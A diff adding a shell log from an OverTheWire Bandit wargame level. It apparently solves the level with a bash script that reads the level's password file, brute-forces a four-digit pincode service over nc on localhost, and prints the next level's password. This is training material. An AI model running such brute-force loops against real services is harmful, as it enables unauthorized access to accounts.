@@ -1,0 +1,18 @@
+bandit24@bandit:/tmp/tmp_di$ cat output.txt | grep -v "Wr*"
+I am the pincode checker for user bandit25. Please enter the password for user
+bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
+Exiting.
+bandit24@bandit:/tmp/tmp_di$ cat script.sh
+#!/bin/bash
+
+old_pass=$(cat /etc/bandit_pass/bandit24)
+
+for i in {0000..9999}; do
+        echo "$old_pass $i" >> /tmp/tmp_di/input.txt
+done
+
+cat /tmp/tmp_di/input.txt | nc localhost 30002 > /tmp/tmp_di/password
+
